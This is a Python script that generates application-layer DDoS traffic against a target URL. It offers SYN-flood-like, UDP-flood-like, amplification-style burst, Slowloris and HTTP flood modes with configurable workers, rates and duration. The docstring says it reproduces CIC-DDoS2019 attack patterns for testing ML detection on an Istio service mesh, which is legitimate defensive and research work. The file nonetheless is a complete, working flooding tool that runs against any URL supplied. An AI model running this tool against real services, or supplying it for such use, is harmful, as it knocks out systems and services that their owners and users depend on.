#!/usr/bin/env python3
"""
DDoS Attack Patterns Based on CIC-DDoS2019 Training Data

This script simulates the attack patterns that the ML models were trained on,
adapted for application-level attacks on Istio service mesh.

The models were trained on these CIC-DDoS2019 attack types:
- SYN Flood, UDP Flood, DNS/NTP/LDAP/MSSQL/NetBIOS/SNMP/TFTP/Portmap Amplification

We simulate these patterns at the HTTP/application layer with equivalent behaviors.
"""

import asyncio
import aiohttp
import argparse
import time
import random
from datetime import datetime
from typing import List, Tuple


class TrainedAttackPattern:
    """Base class for attack patterns matching CIC-DDoS2019 training data"""
    
    def __init__(self, target_url: str, workers: int, duration: int):
        self.target_url = target_url
        self.workers = workers
        self.duration = duration
        self.attack_name = "Generic"
        self.stats = {'requests': 0, 'errors': 0, 'start_time': None}
    
    async def execute(self):
        """Execute the attack pattern"""
        self.stats['start_time'] = datetime.now()
        print(f"\n{'='*70}")
        print(f"🚨 {self.attack_name} Attack Pattern")
        print(f"{'='*70}")
        print(f"Target: {self.target_url}")
        print(f"Workers: {self.workers}")
        print(f"Duration: {self.duration}s")
        print(f"Pattern: {self.get_pattern_description()}")
        print(f"Started: {self.stats['start_time'].strftime('%H:%M:%S')}")
        print(f"{'='*70}\n")
        
        # Create connector with high limits
        connector = aiohttp.TCPConnector(
            limit=self.workers * 2,
            limit_per_host=self.workers,
            ttl_dns_cache=300
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for i in range(self.workers):
                task = asyncio.create_task(self.worker(session, i))
                tasks.append(task)
            
            await asyncio.gather(*tasks, return_exceptions=True)
        
        self._print_summary()
    
    async def worker(self, session, worker_id: int):
        """Override in subclasses"""
        raise NotImplementedError
    
    def get_pattern_description(self) -> str:
        """Override in subclasses"""
        return "Generic attack pattern"
    
    def _print_summary(self):
        elapsed = (datetime.now() - self.stats['start_time']).total_seconds()
        rate = self.stats['requests'] / elapsed if elapsed > 0 else 0
        error_rate = (self.stats['errors'] / self.stats['requests'] * 100) if self.stats['requests'] > 0 else 0
        
        print(f"\n{'='*70}")
        print(f"✅ {self.attack_name} Complete")
        print(f"{'='*70}")
        print(f"Total Requests: {self.stats['requests']:,}")
        print(f"Errors: {self.stats['errors']:,} ({error_rate:.1f}%)")
        print(f"Duration: {elapsed:.1f}s")
        print(f"Average Rate: {rate:.1f} req/s")
        print(f"{'='*70}\n")


class SYNFloodPattern(TrainedAttackPattern):
    """
    SYN Flood Pattern (CIC-DDoS2019: 70,336 samples)
    
    Characteristics:
    - High packet rate (thousands/sec)
    - Short/incomplete connections
    - Minimal payload
    - Connection exhaustion
    
    HTTP Equivalent:
    - Rapid connection opening
    - Minimal request data
    - Immediate connection close
    - High connection churn rate
    """
    
    def __init__(self, target_url: str, workers: int = 100, duration: int = 60):
        super().__init__(target_url, workers, duration)
        self.attack_name = "SYN Flood"
    
    def get_pattern_description(self) -> str:
        return "Rapid connection opening/closing, minimal data transfer"
    
    async def worker(self, session, worker_id: int):
        end_time = time.time() + self.duration
        
        while time.time() < end_time:
            try:
                # Rapid requests with minimal timeout
                async with session.get(
                    self.target_url,
                    timeout=aiohttp.ClientTimeout(total=1)
                ) as resp:
                    # Don't read body, just open connection
                    pass
                
                self.stats['requests'] += 1
                
                # Minimal delay between requests (simulating SYN flood rate)
                await asyncio.sleep(0.01)  # 100 req/s per worker
                
            except Exception:
                self.stats['errors'] += 1


class UDPFloodPattern(TrainedAttackPattern):
    """
    UDP Flood Pattern (CIC-DDoS2019: 12,377 samples)
    
    Characteristics:
    - High packet rate
    - Small, uniform packet sizes
    - No connection state
    - Bandwidth saturation
    
    HTTP Equivalent:
    - Fire-and-forget requests
    - No response reading
    - Constant high rate
    - Small payloads
    """
    
    def __init__(self, target_url: str, workers: int = 80, duration: int = 60):
        super().__init__(target_url, workers, duration)
        self.attack_name = "UDP Flood"
    
    def get_pattern_description(self) -> str:
        return "Fire-and-forget requests, no response waiting, constant high rate"
    
    async def worker(self, session, worker_id: int):
        end_time = time.time() + self.duration
        
        while time.time() < end_time:
            try:
                # Fire request without waiting for full response
                asyncio.create_task(self._fire_request(session))
                self.stats['requests'] += 1
                
                # Constant rate: 150 req/s per worker
                await asyncio.sleep(1/150)
                
            except Exception:
                self.stats['errors'] += 1
    
    async def _fire_request(self, session):
        try:
            async with session.get(
                self.target_url,
                timeout=aiohttp.ClientTimeout(total=0.5)
            ) as resp:
                # Don't wait for body
                pass
        except:
            pass


class AmplificationPattern(TrainedAttackPattern):
    """
    Amplification Attack Pattern
    (DNS/NTP/LDAP/MSSQL/NetBIOS/SNMP/TFTP/Portmap)
    
    Characteristics:
    - Small request, large response
    - High response/request ratio (10x-100x)
    - Burst pattern
    - Bandwidth exhaustion
    
    HTTP Equivalent:
    - Request endpoints with large responses
    - Query parameters causing expensive operations
    - Burst traffic pattern
    - Target resource-heavy endpoints
    """
    
    def __init__(self, target_url: str, workers: int = 50, duration: int = 60, 
                 amplification_type: str = "DNS"):
        super().__init__(target_url, workers, duration)
        self.amplification_type = amplification_type
        self.attack_name = f"{amplification_type} Amplification"
        
        # Different amplification types have different burst patterns
        self.burst_patterns = {
            'DNS': (10, 0.1),      # 10 req burst, 0.1s between bursts
            'NTP': (20, 0.05),     # 20 req burst, 0.05s between bursts
            'LDAP': (15, 0.08),    # 15 req burst, 0.08s between bursts
            'MSSQL': (8, 0.15),    # 8 req burst, 0.15s between bursts
            'NetBIOS': (12, 0.12), # 12 req burst, 0.12s between bursts
            'SNMP': (25, 0.04),    # 25 req burst, 0.04s between bursts
            'TFTP': (18, 0.06),    # 18 req burst, 0.06s between bursts
            'Portmap': (10, 0.10), # 10 req burst, 0.10s between bursts
        }
    
    def get_pattern_description(self) -> str:
        burst_size, burst_interval = self.burst_patterns[self.amplification_type]
        return f"Burst pattern: {burst_size} requests every {burst_interval}s, requests heavy endpoints"
    
    async def worker(self, session, worker_id: int):
        end_time = time.time() + self.duration
        burst_size, burst_interval = self.burst_patterns[self.amplification_type]
        
        while time.time() < end_time:
            try:
                # Send burst of requests
                tasks = []
                for _ in range(burst_size):
                    task = self._amplification_request(session)
                    tasks.append(task)
                
                await asyncio.gather(*tasks, return_exceptions=True)
                self.stats['requests'] += burst_size
                
                # Wait before next burst
                await asyncio.sleep(burst_interval)
                
            except Exception:
                self.stats['errors'] += 1
    
    async def _amplification_request(self, session):
        try:
            # Target endpoints likely to have large responses
            endpoints = ['/', '/catalogue', '/catalogue/images', '/category.html']
            endpoint = random.choice(endpoints)
            
            # Add query params to increase response size
            params = {
                'page': random.randint(1, 100),
                'size': random.randint(50, 200),
                'sort': 'price'
            }
            
            async with session.get(
                f"{self.target_url.rstrip('/')}{endpoint}",
                params=params,
                timeout=aiohttp.ClientTimeout(total=3)
            ) as resp:
                # Read full response (amplification effect)
                await resp.read()
        except:
            pass


class SlowlorisPattern(TrainedAttackPattern):
    """
    Slowloris Pattern (Resource Exhaustion)
    
    Characteristics:
    - Slow, partial requests
    - Connection holding
    - Resource exhaustion
    - Long-lived connections
    
    HTTP Equivalent:
    - Slow headers/body transmission
    - Keep-alive abuse
    - Connection pool exhaustion
    """
    
    def __init__(self, target_url: str, workers: int = 200, duration: int = 120):
        super().__init__(target_url, workers, duration)
        self.attack_name = "Slowloris (Resource Exhaustion)"
    
    def get_pattern_description(self) -> str:
        return "Slow partial requests, connection holding, resource exhaustion"
    
    async def worker(self, session, worker_id: int):
        end_time = time.time() + self.duration
        
        while time.time() < end_time:
            try:
                # Start request but read response very slowly
                async with session.get(
                    self.target_url,
                    timeout=aiohttp.ClientTimeout(total=30, sock_read=30)
                ) as resp:
                    # Read response byte by byte (very slow)
                    async for chunk in resp.content.iter_chunked(1):
                        await asyncio.sleep(0.5)  # Slow read
                        if time.time() >= end_time:
                            break
                
                self.stats['requests'] += 1
                
            except Exception:
                self.stats['errors'] += 1
                await asyncio.sleep(1)


class HTTPFloodPattern(TrainedAttackPattern):
    """
    HTTP Flood Pattern (Generic High-Rate Application Attack)
    
    Characteristics:
    - High request rate
    - Valid HTTP requests
    - Sustained load
    - Resource consumption
    """
    
    def __init__(self, target_url: str, workers: int = 50, duration: int = 60, rate: int = 100):
        super().__init__(target_url, workers, duration)
        self.attack_name = "HTTP Flood"
        self.rate = rate  # requests per second per worker
    
    def get_pattern_description(self) -> str:
        total_rate = self.workers * self.rate
        return f"Sustained high-rate valid requests: {total_rate} req/s total"
    
    async def worker(self, session, worker_id: int):
        end_time = time.time() + self.duration
        interval = 1.0 / self.rate
        count = 0
        
        while time.time() < end_time:
            try:
                start = time.time()
                
                async with session.get(
                    self.target_url,
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    await resp.read()
                
                self.stats['requests'] += 1
                count += 1
                
                if count % 100 == 0:
                    print(f"Worker {worker_id}: {count} requests sent")
                
                # Maintain constant rate
                elapsed = time.time() - start
                sleep_time = max(0, interval - elapsed)
                await asyncio.sleep(sleep_time)
                
            except Exception:
                self.stats['errors'] += 1


async def main():
    parser = argparse.ArgumentParser(
        description="DDoS attack patterns based on CIC-DDoS2019 training data"
    )
    parser.add_argument('--target', required=True, help='Target URL (e.g., http://192.168.49.2:30001)')
    parser.add_argument('--pattern', required=True, 
                       choices=['syn', 'udp', 'dns', 'ntp', 'ldap', 'mssql', 'netbios', 
                               'snmp', 'tftp', 'portmap', 'slowloris', 'http-flood'],
                       help='Attack pattern to simulate')
    parser.add_argument('--workers', type=int, default=None, 
                       help='Number of concurrent workers (default varies by pattern)')
    parser.add_argument('--duration', type=int, default=60, 
                       help='Attack duration in seconds')
    parser.add_argument('--rate', type=int, default=100,
                       help='Requests per second per worker (HTTP flood only)')
    
    args = parser.parse_args()
    
    # Create attack pattern based on type
    if args.pattern == 'syn':
        attack = SYNFloodPattern(args.target, args.workers or 100, args.duration)
    elif args.pattern == 'udp':
        attack = UDPFloodPattern(args.target, args.workers or 80, args.duration)
    elif args.pattern in ['dns', 'ntp', 'ldap', 'mssql', 'netbios', 'snmp', 'tftp', 'portmap']:
        attack = AmplificationPattern(
            args.target, 
            args.workers or 50, 
            args.duration,
            args.pattern.upper()
        )
    elif args.pattern == 'slowloris':
        attack = SlowlorisPattern(args.target, args.workers or 200, args.duration)
    elif args.pattern == 'http-flood':
        attack = HTTPFloodPattern(args.target, args.workers or 50, args.duration, args.rate)
    else:
        print(f"Unknown pattern: {args.pattern}")
        return
    
    # Execute attack
    await attack.execute()


if __name__ == "__main__":
    asyncio.run(main())
